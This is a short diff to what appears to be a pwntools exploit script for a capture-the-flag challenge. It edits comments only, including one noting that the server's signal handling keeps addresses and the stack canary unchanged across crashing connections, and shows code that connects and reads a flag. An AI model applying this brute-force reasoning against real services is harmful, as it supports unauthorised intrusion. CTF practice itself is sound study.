@@ -70,7 +70,7 @@ with context.quiet:     # Avoiding pwtools to print all the info (conncetion sta
         if args.GDB:
             pid = int(serv.__getattr__('pid'))
             print(pid)
-            gdb.attach(pid, gdbscript=COMMANDS)
+            gdb.attach(pid, gdbscript=COMMANDS)     # Attaching the debuggeer to the 
 
         c = remote(target, port, ssl=ssl)
         c.recvuntil(b'name?\n')
@@ -81,7 +81,7 @@ with context.quiet:     # Avoiding pwtools to print all the info (conncetion sta
         c.recvline()
 
         try:
-            msg = c.recvline(keepends=False)    # I dunno why, in local it always stops here at second iteration
+            msg = c.recvline(keepends=False)    # I dunno why, in local it always stops here at second iteration (WSL)
             flag = msg.split(b': ')[1].decode('utf-8')
             c.close()
             break
@@ -101,5 +101,5 @@ print('Done.\n' + flag)
 SIGCHLD 17: Child process has stopped or exited, changed (POSIX)
 sa.flags = 0x10000000 means SA_RESTART:
     this grants the main to continue execution even if one if its child threads exits
-=> instr sigaction(17, &sa, 0LL) is useless for us
+=> instr sigaction(17, &sa, 0LL) only ensures us that we can go on connecting to the same run of the server, even if a previous connection led to a segmentation fault (addresses and canary don't change)
 '''
